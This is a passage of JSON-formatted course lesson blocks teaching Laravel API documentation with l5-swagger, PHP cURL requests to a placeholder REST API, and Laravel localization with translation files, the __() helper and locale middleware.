`L5_SWAGGER_GENERATE_ALWAYS=true` in `.env`)."},{"kind":"h2","html":"OpenAPI vs Swagger — the distinction that is always tested","text":"OpenAPI vs Swagger — the distinction that is always tested"},{"kind":"p","html":"These two terms are often used interchangeably. They are not the same thing.","text":"These two terms are often used interchangeably. They are not the same thing."},{"kind":"mermaid","source":"graph LR\n    A[\"OpenAPI Specification\\n(YAML / JSON contract)\"] --\u003e|\"read by\"| B[\"Swagger UI\\n(interactive browser docs)\"]\n    A --\u003e|\"read by\"| C[\"Swagger Editor\\n(write + validate spec)\"]\n    A --\u003e|\"read by\"| D[\"Swagger Codegen\\n(generate client SDKs)\"]\n    style A fill:#e8f4fd,stroke:#2c7be5\n    style B fill:#f0fff0,stroke:#28a745\n    style C fill:#f0fff0,stroke:#28a745\n    style D fill:#f0fff0,stroke:#28a745"},{"kind":"p","html":"\u003cstrong\u003eOpenAPI\u003c/strong\u003e is the specification language — a YAML or JSON contract that describes your REST API: its paths, parameters, request bodies, and response schemas. \u003cstrong\u003eSwagger\u003c/strong\u003e is the toolset built around that spec: Swagger UI lets users explore and test endpoints in the browser; Swagger Editor lets you write and validate the spec directly; Swagger Codegen generates client libraries from the spec.","text":"**OpenAPI** is the specification language — a YAML or JSON contract that describes your REST API: its paths, parameters, request bodies, and response schemas. **Swagger** is the toolset built around that spec: Swagger UI lets users explore and test endpoints in the browser; Swagger Editor lets you write and validate the spec directly; Swagger Codegen generates client libraries from the spec."},{"kind":"p","html":"In the Laravel workflow, \u003ccode\u003e@OA\\ annotations\u003c/code\u003e in your PHP files are the authoring format. l5-swagger compiles them into the OpenAPI JSON. Swagger UI reads that JSON and renders the documentation page.","text":"In the Laravel workflow, `@OA\\ annotations` in your PHP files are the authoring format. l5-swagger compiles them into the OpenAPI JSON. Swagger UI reads that JSON and renders the documentation page."},{"kind":"checkpoint","q":"A classmate says \"I wrote my Swagger spec in PHP annotations.\" What is the precise correction?","a":"The annotations produce an OpenAPI spec. Swagger is the toolset (UI, Editor, Codegen) that consumes that spec. The spec language is OpenAPI."},{"kind":"h2","html":"Installing l5-swagger","text":"Installing l5-swagger"},{"kind":"p","html":"The Composer package is \u003ccode\u003edarkaonline/l5-swagger\u003c/code\u003e. Install it with the \u003ccode\u003e-W\u003c/code\u003e flag to resolve dependency constraints:","text":"The Composer package is `darkaonline/l5-swagger`. Install it with the `-W` flag to resolve dependency constraints:"},{"kind":"code","lang":"bash","code":"composer require darkaonline/l5-swagger -W"},{"kind":"p","html":"After installation, publish the config so you can customize it:","text":"After installation, publish the config so you can customize it:"},{"kind":"code","lang":"bash","code":"php artisan vendor:publish --provider=\"L5Swagger\\L5SwaggerServiceProvider\""},{"kind":"p","html":"\u003ccode\u003evendor:publish\u003c/code\u003e copies the package&#39;s config file into \u003ccode\u003econfig/l5-swagger.php\u003c/code\u003e. Without this step, Swagger UI serves a blank or broken page — the route exists but has no configuration to read.","text":"`vendor:publish` copies the package's config file into `config/l5-swagger.php`. Without this step, Swagger UI serves a blank or broken page — the route exists but has no configuration to read."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eRunning \u003ccode\u003ecomposer require darkaonline/l5-swagger\u003c/code\u003e without \u003ccode\u003e-W\u003c/code\u003e often fails on Laravel 11+ due to dependency version conflicts. Always use the \u003ccode\u003e-W\u003c/code\u003e flag.\u003c/p\u003e","text":"Running `composer require darkaonline/l5-swagger` without `-W` often fails on Laravel 11+ due to dependency version conflicts. Always use the `-W` flag."},{"kind":"h2","html":"The @OA\\Info block — where it lives and why","text":"The @OA\\Info block — where it lives and why"},{"kind":"p","html":"The \u003ccode\u003e@OA\\Info\u003c/code\u003e annotation is the top-level metadata block for your entire API. It must appear exactly once and belongs on the abstract base \u003ccode\u003eController\u003c/code\u003e class at \u003ccode\u003eapp/Http/Controllers/Controller.php\u003c/code\u003e:","text":"The `@OA\\Info` annotation is the top-level metadata block for your entire API. It must appear exactly once and belongs on the abstract base `Controller` class at `app/Http/Controllers/Controller.php`:"},{"kind":"code","lang":"php","code":"use OpenApi\\Attributes as OA;\n\n#[OA\\Info(\n    title: \"Laravel Students API\",\n    version: \"1.0.0\",\n    description: \"API for managing students\",\n    contact: new OA\\Contact(email: \"admin@example.com\")\n)]\nabstract class Controller\n{\n    // ...\n}"},{"kind":"p","html":"The \u003ccode\u003etitle\u003c/code\u003e and \u003ccode\u003eversion\u003c/code\u003e fields are required by the OpenAPI spec. Without \u003ccode\u003e@OA\\Info\u003c/code\u003e, \u003ccode\u003ephp artisan l5-swagger:generate\u003c/code\u003e produces an invalid OpenAPI document and Swagger UI shows an error.","text":"The `title` and `version` fields are required by the OpenAPI spec. Without `@OA\\Info`, `php artisan l5-swagger:generate` produces an invalid OpenAPI document and Swagger UI shows an error."},{"kind":"h2","html":"Annotating individual endpoints","text":"Annotating individual endpoints"},{"kind":"p","html":"Each HTTP method gets its own annotation immediately above the controller method. The annotation type mirrors the HTTP verb: \u003ccode\u003e@OA\\Get\u003c/code\u003e, \u003ccode\u003e@OA\\Post\u003c/code\u003e, \u003ccode\u003e@OA\\Put\u003c/code\u003e, \u003ccode\u003e@OA\\Delete\u003c/code\u003e.","text":"Each HTTP method gets its own annotation immediately above the controller method. The annotation type mirrors the HTTP verb: `@OA\\Get`, `@OA\\Post`, `@OA\\Put`, `@OA\\Delete`."},{"kind":"p","html":"A \u003ccode\u003estore()\u003c/code\u003e method with a request body:","text":"A `store()` method with a request body:"},{"kind":"code","lang":"php","code":"#[OA\\Post(\n    path: \"/api/students\",\n    tags: [\"Students\"],\n    summary: \"Create a new student\",\n    requestBody: new OA\\RequestBody(\n        required: true,\n        content: new OA\\JsonContent(ref: \"#/components/schemas/StudentRequest\")\n    ),\n    responses: [\n        new OA\\Response(response: 201, description: \"Student created successfully\"),\n        new OA\\Response(response: 422, description: \"Validation error\")\n    ]\n)]\npublic function store(Request $request): JsonResponse\n{\n    // ...\n}"},{"kind":"p","html":"A \u003ccode\u003eshow()\u003c/code\u003e method with a path parameter:","text":"A `show()` method with a path parameter:"},{"kind":"code","lang":"php","code":"#[OA\\Get(\n    path: \"/api/students/{id}\",\n    tags: [\"Students\"],\n    summary: \"Get a student by ID\",\n    parameters: [\n        new OA\\Parameter(\n            name: \"id\",\n            in: \"path\",\n            required: true,\n            description: \"Student ID\",\n            schema: new OA\\Schema(type: \"integer\")\n        )\n    ],\n    responses: [\n        new OA\\Response(response: 200, description: \"Student details\"),\n        new OA\\Response(response: 404, description: \"Student not found\")\n    ]\n)]\npublic function show(int $id): JsonResponse\n{\n    // ...\n}"},{"kind":"p","html":"Use \u003ccode\u003e@OA\\Parameter\u003c/code\u003e whenever a route has a \u003ccode\u003e{placeholder}\u003c/code\u003e. The \u003ccode\u003ein: &quot;path&quot;\u003c/code\u003e value tells Swagger UI to render an input box for that segment.","text":"Use `@OA\\Parameter` whenever a route has a `{placeholder}`. The `in: \"path\"` value tells Swagger UI to render an input box for that segment."},{"kind":"h2","html":"Reusable schemas with @OA\\Schema","text":"Reusable schemas with @OA\\Schema"},{"kind":"p","html":"Repeating response shapes in every annotation creates maintenance overhead. Define a schema once and reference it:","text":"Repeating response shapes in every annotation creates maintenance overhead. Define a schema once and reference it:"},{"kind":"code","lang":"php","code":"#[OA\\Schema(\n    schema: \"Student\",\n    properties: [\n        new OA\\Property(property: \"id\",         type: \"integer\", example: 1),\n        new OA\\Property(property: \"FirstName\",  type: \"string\",  example: \"John\"),\n        new OA\\Property(property: \"LastName\",   type: \"string\",  example: \"Doe\"),\n        new OA\\Property(property: \"School\",     type: \"string\",  example: \"BCIT\"),\n    ]\n)]"},{"kind":"p","html":"Then reference it from any response or request body: \u003ccode\u003eref: &quot;#/components/schemas/Student&quot;\u003c/code\u003e. Swagger UI renders the schema as an expandable model in the documentation.","text":"Then reference it from any response or request body: `ref: \"#/components/schemas/Student\"`. Swagger UI renders the schema as an expandable model in the documentation."},{"kind":"h2","html":"Generating docs and viewing Swagger UI","text":"Generating docs and viewing Swagger UI"},{"kind":"p","html":"After adding or changing annotations, regenerate:","text":"After adding or changing annotations, regenerate:"},{"kind":"code","lang":"bash","code":"php artisan l5-swagger:generate"},{"kind":"p","html":"Then visit \u003ccode\u003e/api/documentation\u003c/code\u003e in your browser. Swagger UI renders every documented endpoint with expand/collapse controls, try-it-out buttons, and example request/response bodies.","text":"Then visit `/api/documentation` in your browser. Swagger UI renders every documented endpoint with expand/collapse controls, try-it-out buttons, and example request/response bodies."},{"kind":"p","html":"For development convenience, set \u003ccode\u003eL5_SWAGGER_GENERATE_ALWAYS=true\u003c/code\u003e in \u003ccode\u003e.env\u003c/code\u003e to auto-regenerate on every request. Restart the dev server after changing this variable.","text":"For development convenience, set `L5_SWAGGER_GENERATE_ALWAYS=true` in `.env` to auto-regenerate on every request. Restart the dev server after changing this variable."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eEditing an annotation and refreshing \u003ccode\u003e/api/documentation\u003c/code\u003e without re-running \u003ccode\u003ephp artisan l5-swagger:generate\u003c/code\u003e shows stale docs. The generate step is a required compile step, not an automatic one (unless \u003ccode\u003eL5_SWAGGER_GENERATE_ALWAYS=true\u003c/code\u003e is set).\u003c/p\u003e","text":"Editing an annotation and refreshing `/api/documentation` without re-running `php artisan l5-swagger:generate` shows stale docs. The generate step is a required compile step, not an automatic one (unless `L5_SWAGGER_GENERATE_ALWAYS=true` is set)."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003eOpenAPI is the contract language; Swagger is the toolset. In Laravel, \u003ccode\u003e@OA\\ annotations\u003c/code\u003e on controllers are the authoring surface. l5-swagger compiles them via \u003ccode\u003ephp artisan l5-swagger:generate\u003c/code\u003e into an OpenAPI JSON document that Swagger UI serves at \u003ccode\u003e/api/documentation\u003c/code\u003e. Every change to an annotation requires a regeneration step.\u003c/p\u003e","text":"OpenAPI is the contract language; Swagger is the toolset. In Laravel, `@OA\\ annotations` on controllers are the authoring surface. l5-swagger compiles them via `php artisan l5-swagger:generate` into an OpenAPI JSON document that Swagger UI serves at `/api/documentation`. Every change to an annotation requires a regeneration step."}]},{"n":12,"id":"curl-http-client","title":"cURL as an HTTP Client","hook":"One function call gives you a live REST API response — but only if you set the right option first.","tags":["curl","http","php","rest-client"],"module":"Swagger and cURL","source":"cURL.pptx slides 4–5","blocks":[{"kind":"h2","html":"A working GET request, start to finish","text":"A working GET request, start to finish"},{"kind":"p","html":"Run this code and \u003ccode\u003e$data\u003c/code\u003e holds the decoded JSON from the API.","text":"Run this code and `$data` holds the decoded JSON from the API."},{"kind":"code","lang":"php","code":"\u003c?php\n// Step 1: Initialize — get a cURL handle\n$ch = curl_init();\n\n// Step 2: Configure options\ncurl_setopt($ch, CURLOPT_URL, 'https://api.example.com/students');\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n\n// Step 3: Execute — sends the HTTP request\n$response = curl_exec($ch);\n\n// Step 4: Release the handle\ncurl_close($ch);\n\n// Step 5: Decode JSON string into a PHP associative array\n$data = json_decode($response, true);\n?\u003e"},{"kind":"p","html":"Every cURL request follows this exact five-step sequence: \u003ccode\u003ecurl_init()\u003c/code\u003e → \u003ccode\u003ecurl_setopt()\u003c/code\u003e → \u003ccode\u003ecurl_exec()\u003c/code\u003e → \u003ccode\u003ecurl_close()\u003c/code\u003e → \u003ccode\u003ejson_decode()\u003c/code\u003e.\nSkipping or reordering any step produces either an error or silent wrong output.","text":"Every cURL request follows this exact five-step sequence: `curl_init()` → `curl_setopt()` → `curl_exec()` → `curl_close()` → `json_decode()`.\nSkipping or reordering any step produces either an error or silent wrong output."},{"kind":"checkpoint","q":"What does `curl_init()` return?","a":"A cURL handle — a PHP resource you pass to every subsequent `curl_*` function call."},{"kind":"h2","html":"The five-step sequence in detail","text":"The five-step sequence in detail"},{"kind":"h3","html":"Step 1 — \u003ccode\u003ecurl_init()\u003c/code\u003e","text":"Step 1 — `curl_init()`"},{"kind":"p","html":"\u003ccode\u003ecurl_init()\u003c/code\u003e initializes a new cURL session and returns a \u003cstrong\u003ecURL handle\u003c/strong\u003e.\nYou store that handle in a variable (conventionally \u003ccode\u003e$ch\u003c/code\u003e) and pass it to all later calls.","text":"`curl_init()` initializes a new cURL session and returns a **cURL handle**.\nYou store that handle in a variable (conventionally `$ch`) and pass it to all later calls."},{"kind":"code","lang":"php","code":"$ch = curl_init();"},{"kind":"p","html":"You can also pass the URL directly: \u003ccode\u003ecurl_init(&#39;https://api.example.com/students&#39;)\u003c/code\u003e.\nBoth approaches are valid; passing it separately with \u003ccode\u003ecurl_setopt\u003c/code\u003e is clearer for multiple options.","text":"You can also pass the URL directly: `curl_init('https://api.example.com/students')`.\nBoth approaches are valid; passing it separately with `curl_setopt` is clearer for multiple options."},{"kind":"h3","html":"Step 2 — \u003ccode\u003ecurl_setopt()\u003c/code\u003e","text":"Step 2 — `curl_setopt()`"},{"kind":"p","html":"\u003ccode\u003ecurl_setopt($ch, OPTION, value)\u003c/code\u003e configures one option at a time.\nCall it once per option, or use \u003ccode\u003ecurl_setopt_array()\u003c/code\u003e to set many at once.","text":"`curl_setopt($ch, OPTION, value)` configures one option at a time.\nCall it once per option, or use `curl_setopt_array()` to set many at once."},{"kind":"p","html":"The two most critical options:","text":"The two most critical options:"},{"kind":"code","lang":"php","code":"curl_setopt($ch, CURLOPT_URL, 'https://api.example.com/students');\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);"},{"kind":"p","html":"\u003ccode\u003eCURLOPT_URL\u003c/code\u003e tells cURL where to connect.\n\u003ccode\u003eCURLOPT_RETURNTRANSFER\u003c/code\u003e is the option that determines whether the response is returned as a string (\u003ccode\u003etrue\u003c/code\u003e) or printed directly to the screen (\u003ccode\u003efalse\u003c/code\u003e).","text":"`CURLOPT_URL` tells cURL where to connect.\n`CURLOPT_RETURNTRANSFER` is the option that determines whether the response is returned as a string (`true`) or printed directly to the screen (`false`)."},{"kind":"callout","variant":"pitfall","html":"\u003cp\u003eForgetting \u003ccode\u003eCURLOPT_RETURNTRANSFER\u003c/code\u003e is the most common cURL mistake. When it is not set (or set to \u003ccode\u003efalse\u003c/code\u003e), \u003ccode\u003ecurl_exec()\u003c/code\u003e prints the response to the browser immediately — \u003ccode\u003e$response\u003c/code\u003e is \u003ccode\u003etrue\u003c/code\u003e, not the data. The variable is useless and you cannot call \u003ccode\u003ejson_decode()\u003c/code\u003e on it.\u003c/p\u003e","text":"Forgetting `CURLOPT_RETURNTRANSFER` is the most common cURL mistake. When it is not set (or set to `false`), `curl_exec()` prints the response to the browser immediately — `$response` is `true`, not the data. The variable is useless and you cannot call `json_decode()` on it."},{"kind":"h3","html":"Step 3 — \u003ccode\u003ecurl_exec()\u003c/code\u003e","text":"Step 3 — `curl_exec()`"},{"kind":"p","html":"\u003ccode\u003ecurl_exec($ch)\u003c/code\u003e sends the HTTP request and returns the response body as a string.\nAlways check for errors before continuing:","text":"`curl_exec($ch)` sends the HTTP request and returns the response body as a string.\nAlways check for errors before continuing:"},{"kind":"code","lang":"php","code":"$response = curl_exec($ch);\nif ($response === false) {\n    echo 'cURL error: ' . curl_error($ch);\n}"},{"kind":"p","html":"Use \u003ccode\u003e=== false\u003c/code\u003e (strict equality) because an empty response string \u003ccode\u003e&#39;&#39;\u003c/code\u003e is valid and truthy-false comparisons would misidentify it as an error.","text":"Use `=== false` (strict equality) because an empty response string `''` is valid and truthy-false comparisons would misidentify it as an error."},{"kind":"h3","html":"Step 4 — \u003ccode\u003ecurl_close()\u003c/code\u003e","text":"Step 4 — `curl_close()`"},{"kind":"p","html":"\u003ccode\u003ecurl_close($ch)\u003c/code\u003e releases the cURL handle and frees the associated memory.\nCall it after \u003ccode\u003ecurl_exec()\u003c/code\u003e and before you process the response — but after you are done making requests with that handle.","text":"`curl_close($ch)` releases the cURL handle and frees the associated memory.\nCall it after `curl_exec()` and before you process the response — but after you are done making requests with that handle."},{"kind":"code","lang":"php","code":"curl_close($ch);"},{"kind":"h3","html":"Step 5 — \u003ccode\u003ejson_decode()\u003c/code\u003e","text":"Step 5 — `json_decode()`"},{"kind":"p","html":"REST APIs return JSON strings. \u003ccode\u003ejson_decode($response, true)\u003c/code\u003e converts the JSON string into a PHP associative array.","text":"REST APIs return JSON strings. `json_decode($response, true)` converts the JSON string into a PHP associative array."},{"kind":"code","lang":"php","code":"$data = json_decode($response, true);"},{"kind":"p","html":"The second argument \u003ccode\u003etrue\u003c/code\u003e forces associative array output. Without it, \u003ccode\u003ejson_decode\u003c/code\u003e returns a \u003ccode\u003estdClass\u003c/code\u003e object instead.","text":"The second argument `true` forces associative array output. Without it, `json_decode` returns a `stdClass` object instead."},{"kind":"checkpoint","q":"What does `json_decode($response, true)` return when the second argument is omitted?","a":"A `stdClass` object — not an associative array. Access becomes `$data-\u003ename` instead of `$data['name']`."},{"kind":"h2","html":"Sending a POST request","text":"Sending a POST request"},{"kind":"p","html":"For POST requests, add two additional options after the standard ones:","text":"For POST requests, add two additional options after the standard ones:"},{"kind":"code","lang":"php","code":"$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, 'https://api.example.com/students');\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\ncurl_setopt($ch, CURLOPT_POST, true);\ncurl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([\n    'FirstName' =\u003e 'Jane',\n    'LastName'  =\u003e 'Smith',\n    'School'    =\u003e 'BCIT',\n]));\ncurl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);\n\n$response = curl_exec($ch);\ncurl_close($ch);\n$data = json_decode($response, true);"},{"kind":"p","html":"\u003ccode\u003eCURLOPT_POST\u003c/code\u003e switches the request method to POST.\n\u003ccode\u003eCURLOPT_POSTFIELDS\u003c/code\u003e carries the request body — pass a JSON-encoded string for REST APIs, and set \u003ccode\u003eContent-Type: application/json\u003c/code\u003e via \u003ccode\u003eCURLOPT_HTTPHEADER\u003c/code\u003e.","text":"`CURLOPT_POST` switches the request method to POST.\n`CURLOPT_POSTFIELDS` carries the request body — pass a JSON-encoded string for REST APIs, and set `Content-Type: application/json` via `CURLOPT_HTTPHEADER`."},{"kind":"callout","variant":"takeaway","html":"\u003cp\u003ecURL in PHP follows a strict five-step pattern. The single most important option is \u003ccode\u003eCURLOPT_RETURNTRANSFER\u003c/code\u003e — set it to \u003ccode\u003etrue\u003c/code\u003e or \u003ccode\u003ecurl_exec()\u003c/code\u003e outputs to screen and your variable holds nothing useful. After executing, \u003ccode\u003ejson_decode($response, true)\u003c/code\u003e converts the JSON string into the associative array your application actually uses.\u003c/p\u003e","text":"cURL in PHP follows a strict five-step pattern. The single most important option is `CURLOPT_RETURNTRANSFER` — set it to `true` or `curl_exec()` outputs to screen and your variable holds nothing useful. After executing, `json_decode($response, true)` converts the JSON string into the associative array your application actually uses."}]},{"n":13,"id":"laravel-localization","title":"Laravel Localization","hook":"A single codebase, three languages — here's the mechanism that switches 'Submit' to 'Envoyer' at runtime.","tags":["localization","i18n","laravel","translation","middleware"],"module":"localization-module","source":"localization.pptx slides 1–11; laravel-localization.docx; final-practice.docx Q1–Q2","blocks":[{"kind":"h2","html":"A button label in three languages","text":"A button label in three languages"},{"kind":"p","html":"A travel-site button reads \u003cstrong\u003eSubmit\u003c/strong\u003e in English. Your French users need \u003cstrong\u003eEnvoyer\u003c/strong\u003e. Your German users need \u003cstrong\u003eSenden\u003c/strong\u003e. You do not want three separate Blade templates. You want one template and a translation lookup.","text":"A travel-site button reads **Submit** in English. Your French users need **Envoyer**. Your German users need **Senden**. You do not want three separate Blade templates. You want one template and a translation lookup."},{"kind":"p","html":"This is what that looks like in Blade:","text":"This is what that looks like in Blade:"},{"kind":"code","lang":"blade","code":"\u003cbutton\u003e{{ __('Submit') }}\u003c/button\u003e"},{"kind":"p","html":"When the locale is \u003ccode\u003e&#39;en&#39;\u003c/code\u003e, \u003ccode\u003e__(&#39;Submit&#39;)\u003c/code\u003e returns \u003ccode\u003e&#39;Submit&#39;\u003c/code\u003e. When the locale is \u003ccode\u003e&#39;fr&#39;\u003c/code\u003e and \u003ccode\u003eresources/lang/fr.json\u003c/code\u003e maps \u003ccode\u003e&quot;Submit&quot;\u003c/code\u003e → \u003ccode\u003e&quot;Envoyer&quot;\u003c/code\u003e, the same call returns \u003ccode\u003e&#39;Envoyer&#39;\u003c/code\u003e. No if-statements in the template. No separate views.","text":"When the locale is `'en'`, `__('Submit')` returns `'Submit'`. When the locale is `'fr'` and `resources/lang/fr.json` maps `\"Submit\"` → `\"Envoyer\"`, the same call returns `'Envoyer'`. No if-statements in the template. No separate views."},{"kind":"p","html":"That one line is the entry point. The rest of this lesson explains the file layout, the helpers, and the runtime switching mechanism behind it.","text":"That one line is the entry point. The rest of this lesson explains the file layout, the helpers, and the runtime switching mechanism behind it."},{"kind":"checkpoint","q":"Before reading on — where do you think Laravel stores the French translation for `'Submit'`? What file, what path?","a":"`resources/lang/fr.json`. The file contains JSON key-value pairs where the key is the English phrase and the value is the translation."},{"kind":"h2","html":"The translation file system","text":"The translation file system"},{"kind":"p","html":"Laravel&#39;s localization layer is entirely file-based. All language files live under \u003ccode\u003eresources/lang/\u003c/code\u003e. Two file types serve different purposes:","text":"Laravel's localization layer is entirely file-based. All language files live under `resources/lang/`. Two file types serve different purposes:"},{"kind":"table","html":"\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eFile type\u003c/th\u003e\n\u003cth\u003ePath\u003c/th\u003e\n\u003cth\u003eFormat\u003c/th\u003e\n\u003cth\u003eBest use\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003ePHP translation file\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eresources/lang/{locale}/messages.php\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003ePHP array, keyed by short identifier\u003c/td\u003e\n\u003ctd\u003eStructured domain text (named keys like \u003ccode\u003emessages.welcome\u003c/code\u003e)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eJSON translation file\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eresources/lang/{locale}.json\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eJSON object, key = English phrase\u003c/td\u003e\n\u003ctd\u003eSimple UI strings (key = the phrase itself)\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e"},{"kind":"p","html":"A \u003cstrong\u003ePHP translation file\u003c/strong\u003e returns an associative array:","text":"A **PHP translation file** returns an associative array:"},{"kind":"code","lang":"php","code":"// resources/lang/en/messages.php\nreturn [\n    'welcome' =\u003e 'Welcome to our application',\n];"},{"kind":"p","html":"Retrieve it with \u003ccode\u003e__(&#39;messages.welcome&#39;)\u003c/code\u003e — dot notation means &quot;the file \u003ccode\u003emessages.php\u003c/code\u003e, key \u003ccode\u003ewelcome\u003c/code\u003e&quot;.","text":"Retrieve it with `__('messages.welcome')` — dot notation means \"the file `messages.php`, key `welcome`\"."},{"kind":"p","html":"A \u003cstrong\u003eJSON translation file\u003c/strong\u003e uses the English string as the key:","text":"A **JSON translation file** uses the English string as the key:"},{"kind":"code","lang":"json","code":"// resources/lang/fr.json\n{\n    \"Submit\": \"Envoyer\",\n    \"Login\": \"Se connecter\"\n}"},{"kind":"p","html":"Retrieve it with \u003ccode\u003e__(&#39;Submit&#39;)\u003c/code\u003e — no dot notation, just the English phrase.","text":"Retrieve it with `__('Submit')` — no dot notation, just the English phrase."},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Do not use PHP translation files and JSON translation files for the same locale and the same key. Laravel looks them up through different mechanisms. If \u003ccode\u003eresources/lang/fr/messages.php\u003c/code\u003e and \u003ccode\u003eresources/lang/fr.json\u003c/code\u003e both exist, the lookup resolves one but not the other depending on key format. Keep PHP files for domain-specific namespaced keys and JSON files for plain UI strings. Mixing them for the same content causes silent misses.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"The \u003ccode\u003e__()\u003c/code\u003e helper","text":"The `__()` helper"},{"kind":"p","html":"\u003ccode\u003e__()\u003c/code\u003e is the single canonical helper for retrieving a translated string. Use it in Blade and in PHP code:","text":"`__()` is the single canonical helper for retrieving a translated string. Use it in Blade and in PHP code:"},{"kind":"code","lang":"blade","code":"{{ __('messages.welcome') }}    {{-- Blade: PHP file key --}}\n{{ __('Submit') }}              {{-- Blade: JSON file key --}}"},{"kind":"code","lang":"php","code":"// In a controller or middleware\n$label = __('messages.welcome');"},{"kind":"html","html":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e The exam tests this directly. \u003ccode\u003etranslate()\u003c/code\u003e, \u003ccode\u003et()\u003c/code\u003e, \u003ccode\u003ei18n()\u003c/code\u003e, \u003ccode\u003elang()\u003c/code\u003e, and \u003ccode\u003etrans()\u003c/code\u003e are not the Laravel helper. The canonical form is \u003ccode\u003e__()\u003c/code\u003e — double underscore. Past-exam Q2 listed all four wrong variants as distractors.\u003c/p\u003e\n\u003c/blockquote\u003e"},{"kind":"h2","html":"Pluralization with \u003ccode\u003etrans_choice()\u003c/code\u003e","text":"Pluralization with `trans_choice()`"},{"kind":"p","html":"Natural language has plural forms. English has two (\u003ccode\u003eapple\u003c/code\u003e vs \u003ccode\u003eapples\u003c/code\u003e). Other languages have more. \u003ccode\u003etrans_choice()\u003c/code\u003e handles this with pipe-delimited rules:","text":"Natural language has plural forms. English has two (`apple` vs `apples`). Other languages have more. `trans_choice()` handles this with pipe-delimited rules:"},{"kind":"code","lang":"php","code":"// resources/lang/en/messages.php\nreturn [\n    'apples' =\u003e '{0} No apples|{1} One apple|[2,*] :count apples',\n];"},{"kind":"p","html":"The syntax:","text":"The syntax:"},{"kind":"p","html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e{0}\u003c/code\u003e — exact match for zero\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e{1}\u003c/code\u003e — exact match for one\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e[2,*]\u003c/code\u003e — range from 2 to infinity\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e:count\u003c/code\u003e — replaced by the numeric argument at runtime\u003c/li\u003e\n\u003c/ul\u003e","text":"- `{0}` — exact match for zero\n- `{1}` — exact match for one\n- `[2,*]` — range from 2 to infinity\n- `:count` — replaced by the numeric argument at runtime"},{"kind":"p","html":"Call it with the count as the second argument:","text":"Call it with the count as the second argument:"},{"kind":"code","lang":"php","code":"echo trans_choice('messages.apples', 0);   // \"No apples\"\necho trans_choice('messages.apples', 1);   // \"One apple\"\necho trans_choice('messages.apples', 5);   // \"5 apples\""},{"kind":"checkpoint","q":"What does `trans_choice('messages.apples', 3)` return given the rule `'{0} No apples|{1} One apple|[2,*] :count apples'`?","a":"`\"3 apples\"` — the count 3 matches the `[2,*]` range and `:count` is replaced with `3`."},{"kind":"h2","html":"Setting and reading the locale","text":"Setting and reading the locale"},{"kind":"p","html":"The \u003cstrong\u003edefault locale\u003c/strong\u003e is set in \u003ccode\u003econfig/app.php\u003c/code\u003e under the key \u003ccode\u003e&#39;locale&#39;\u003c/code\u003e:","text":"The **default locale** is set in `config/app.php` under the key `'locale'`:"},{"kind":"code","lang":"php","code":"// config/app.php\n'locale' =\u003e env('APP_LOCALE', 'en'),"},{"kind":"p","html":"At runtime, switch the locale with \u003ccode\u003eApp::setLocale()\u003c/code\u003e:","text":"At runtime, switch the locale with `App::setLocale()`:"},{"kind":"code","lang":"php","code":"App::setLocale('fr');"},{"kind":"p","html":"Read the current locale with \u003ccode\u003eApp::getLocale()\u003c/code\u003e:","text":"Read the current locale with `App::getLocale()`:"},{"kind":"code","lang":"php","code":"$current = App::getLocale(); // returns 'fr'"},{"kind":"p","html":"Both use the \u003ccode\u003eApp\u003c/code\u003e facade — the canonical form for this course. Do not use \u003ccode\u003eapp()-&gt;setLocale()\u003c/code\u003e in exam answers unless the question specifically asks for it.","text":"Both use the `App` facade — the canonical form for this course. Do not use `app()-\u003esetLocale()` in exam answers unless the question specifically asks for it."},{"kind":"h2","html":"Middleware: setting locale per request","text":"Middleware: setting locale per request"},{"kind":"p","html":"Hard-coding \u003ccode\u003eApp::setLocale(&#39;fr&#39;)\u003c/code\u003e in a controller is not scalable. The recommended pattern is a middleware that reads the locale from the session and applies it to every request:","text":"Hard-coding `App::setLocale('fr')` in a controller is not scalable. The recommended pattern is a middleware that reads the locale from the session and applies it to every request:"},{"kind":"code","lang":"php","code":"// app/Http/Middleware/Localization.php\nuse Illuminate\\Support\\Facades\\App;\nuse Illuminate\\Support\\Facades\\Session;\n\npublic function handle(Request $request, Closure $next)\n{\n    if (Session::has('locale')) {\n        App::setLocale(Session::get('locale'));\n    }\n    return $next($request);\n}"},{"kind":"p","html":"A dedicated route stores the chosen locale in the session, then redirects back:","text":"A dedicated route stores the chosen locale in the session, then redirects back:"},{"kind":"code","lang":"php","code":"// routes/web.php\nRoute::get('language/{locale}', function ($locale) {\n    app()-\u003esetLocale($locale);\n    session()-\u003eput('locale', $locale);\n    return redirect()-\u003eback();\n});"},{"kind":"p","html":"The middleware reads it on the next request. This is the full language-switcher pattern from the lab.","text":"The middleware reads it on the next request. This is the full language-switcher pattern from the lab."},{"kind":"h2","html":"Directory structure recap","text":"Directory structure recap"},{"kind":"code","lang":"text","code":"resources/\n└── lang/\n    ├── en/\n    │   └── messages.php     ← PHP translation file (en)\n    ├── fr/\n    │   └── messages.php     ← PHP translation file (fr)\n    ├── en.json              ← JSON translation file (en)\n    ├── fr.json              ← JSON translation file 